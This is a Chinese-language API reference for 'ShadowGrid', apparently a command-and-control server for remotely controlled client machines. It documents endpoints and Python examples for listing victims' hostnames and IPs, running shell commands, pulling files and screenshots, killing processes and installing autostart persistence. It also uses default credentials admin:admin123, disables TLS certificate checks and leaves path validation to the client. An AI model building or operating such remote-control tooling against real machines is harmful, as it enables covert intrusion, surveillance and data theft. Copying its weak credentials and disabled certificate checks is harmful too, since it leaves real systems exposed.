# ShadowGrid 服务端 API 文档

## 概述

ShadowGrid 服务端提供两种通信方式：
- **HTTP API** - 用于管理端连接、命令发送、结果获取
- **WebSocket** - 用于客户端实时通信

**端口**: 8444 (HTTPS/WSS)

## HTTP API

### 1. 登录认证

**POST `/login`**

使用 Basic Auth 或表单密码登录。

#### 请求方式 1: Basic Auth (推荐)

```
Authorization: Basic YWRtaW46YWRtaW4xMjM=
Content-Type: application/x-www-form-urlencoded
```

#### 请求方式 2: 表单密码

```
Content-Type: application/x-www-form-urlencoded
password=admin123
```

#### 响应

成功:
```json
{
  "status": "ok",
  "message": "Login successful"
}
```

失败:
```json
{
  "detail": "Invalid password"
}
```

HTTP Status: `401`

---

### 2. 获取客户端列表

**GET `/clients`**

#### 响应

```json
{
  "clients": [
    {
      "id": "abc12345",
      "hostname": "DESKTOP-XXX",
      "ip": "192.168.1.100"
    },
    {
      "id": "def67890",
      "hostname": "LAPTOP-YYY",
      "ip": "192.168.1.101"
    }
  ]
}
```

---

### 3. 发送命令

**POST `/command/{client_id}`**

#### 请求正文

```json
{
  "type": "ls",
  "payload": "/home/user"
}
```

或简单命令：
```json
{
  "type": "test"
}
```

#### 命令类型

| 命令 | payload 说明 |
|------|-------------|
| `ls` | 路径字符串 (可选, null 表示当前目录) |
| `cd` | 目录路径字符串 |
| `pwd` | null |
| `cat` | 文件路径字符串 |
| `dl` | `{"path": "文件路径", "save_as": "可选新文件名"}` |
| `ud` | `{"base64_data": "文件内容base64", "save_as": "保存路径"}` |
| `rm` | `{"path": "路径", "recursive": true/false}` |
| `mv` | `{"from_path": "源路径", "to_path": "目标路径"}` |
| `file` | `{"path": "文件路径"}` |
| `find` | `{"path": "起始路径", "name": "文件名模式", "type": "f或d"}` |
| `shell` | Shell 命令字符串 |
| `screenshot` | null |
| `echo` | 要回显的文本 |
| `time` | null |
| `test` | null |
| `ps` / `process` | null - 获取系统进程列表 |
| `kill` / `terminate` | `{"pid": 进程ID}` - 结束指定进程 |
| `persist` / `install` | `{"action": "install/remove", "path": 路径字符串}` - 系统持久化管理 |

##### 新增功能: 进程管理

1. **`ps`** 获取进程列表：
```json
{
  "type": "ps"
}
```
响应:
```json
{
  "status": "ok",
  "result": [
    {"pid": 1234, "name": "notepad.exe", "username": "user", "status": "running"},
    {"pid": 5678, "name": "python.exe", "username": "user", "status": "sleeping"}
  ],
  "result_type": "process_list"
}
```

2. **`kill`** 结束进程:
```json
{
  "type": "kill",
  "payload": {
    "pid": 1234
  }
}
```
响应:
```json
{
  "status": "ok",
  "result": "Process 1234 terminated successfully",
  "result_type": "process_killed"
}
```

##### 新增功能: 系统持久化

1. **`persist` install** 系统自动启动:
```json
{
  "type": "persist",
  "payload": {
    "action": "install",
    "path": "/opt/shadowgrid"  # 可选路径参数
  }
}
```

2. **`persist` remove** 移除自启动:
```json
{
  "type": "persist",
  "payload": {
    "action": "remove"
  }
}
```

#### 响应

成功:
```json
{
  "status": "sent"
}
```

失败 (客户端未连接):
```json
{
  "error": "Client not connected"
}
```

---

### 4. 获取命令结果

**GET `/results/{client_id}`**

#### 响应

```json
{
  "results": [
    {
      "status": "ok",
      "result": "目录内容列表...",
      "result_type": "list"
    }
  ]
}
```

如果响应为空，表示没有新结果。

---

### 5. 获取截图文件

**GET `/screenshot/{client_id}/{filename}`**

#### 响应

返回截图图片文件 (PNG)。

---

## WebSocket API

**端点**: `wss://your-server:8444/ws/{client_id}`

### 客户端连接流程

1. 建立 WebSocket 连接
2. 发送注册消息 (5秒内必须发送)
3. 接收和发送命令/结果

### 注册消息

客户端连接后 5 秒内必须发送注册消息：

```json
{
  "type": "register",
  "client_id": "abc12345",
  "hostname": "DESKTOP-XXX",
  "unique_id": "client-uuid"
}
```

### 服务端发送命令

```json
{
  "type": "command",
  "id": "cmd-1709280000000",
  "payload": {
    "type": "ls",
    "payload": "/home/user"
  }
}
```

字段说明:
- `type`: "command"
- `id`: 命令唯一ID (客户端需在结果中回传)
- `payload`: 命令具体数据

### 客户端发送结果

```json
{
  "type": "result",
  "command_id": "cmd-1709280000000",
  "result": {
    "status": "ok",
    "result": "目录列表...",
    "result_type": "list"
  }
}
```

字段说明:
- `type`: "result"
- `command_id`: 对应的命令ID
- `result`: 命令执行结果

### 增强的结果类型

| result_type | result 格式说明 |
|-------------|----------------|
| `list` | `{"name": "文件名", "dir": true/false}` 数组 |
| `dir` | 当前目录路径字符串 |
| `file` | 文件内容 (Base64 编码)，带 `filename` 字段 |
| `shell` | 命令输出字符串 |
| `screenshot` | Base64 编码的图片，带 `filename` 字段 |
| `process_list` | `{"pid": 进程ID, "name": 进程名, "username": 用户名, "status": 状态}` 数组 |
| `process_killed` | 进程结束成功的字符串 |
| `persistence` | 持久化操作状态字符串 |
| `ok` | 成功消息字符串 |
| `error` | 错误消息字符串 |

### 心跳机制

服务端每 0.5 秒检查一次，如果客户端有 pending 命令会发送。

---

## 错误码

| HTTP Status | 说明 |
|-------------|------|
| 200 | 成功 |
| 401 | 认证失败 |
| 404 | 客户端ID不存在 |

---

## 完整示例 (Python)

```python
import requests
import websocket
import json
import base64

# 1. 登录
auth = base64.b64encode(b"admin:admin123").decode()
response = requests.post(
    "https://server:8444/login",
    headers={"Authorization": f"Basic {auth}"},
    verify=False
)
assert response.status_code == 200

# 2. 获取客户端列表
response = requests.get("https://server:8444/clients", verify=False)
clients = response.json()["clients"]

# 3. 发送命令
client_id = clients[0]["id"]
# 系统进程管理
response = requests.post(
    f"https://server:8444/command/{client_id}",
    json={"type": "ps"},  # 进程列表
    verify=False
)

# 终止指定进程
response = requests.post(
    f"https://server:8444/command/{client_id}",
    json={
        "type": "kill",
        "payload": {"pid": 1234}
    },
    verify=False
)

# 4. 获取结果
import time
time.sleep(1)
response = requests.get(f"https://server:8444/results/{client_id}", verify=False)
results = response.json()["results"]
```

```python
# WebSocket 连接示例
import websocket
import json
import ssl

def on_message(ws, message):
    msg = json.loads(message)
    if msg["type"] == "command":
        # 处理命令
        cmd = msg["payload"]
        result = {"status": "ok", "result": "..." , "result_type": "ok"}
        ws.send(json.dumps({
            "type": "result",
            "command_id": msg["id"],
            "result": result
        }))

def on_open(ws):
    ws.send(json.dumps({
        "type": "register",
        "client_id": "client-id",
        "hostname": "hostname"
    }))

ws = websocket.WebSocketApp(
    "wss://server:8444/ws/client-id",
    on_open=on_open,
    on_message=on_message
)
ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})
```

---

## 注意事项

1. **SSL证书**: 生产环境应使用 CA 签名证书
2. **路径安全**: 服务端不验证路径，由客户端验证防止路径遍历
3. **命令队列**: 同一时间只允许一个 pending 命令
4. **结果清除**: 获取结果后会清空结果队列
5. **超时**: 客户端连接后 5 秒内必须发送 register 消息
6. **新增功能**: 进程管理、持久化命令等新功能均通过同一接口实现
7. **安全性**: 确保只有授权用户能够访问此API
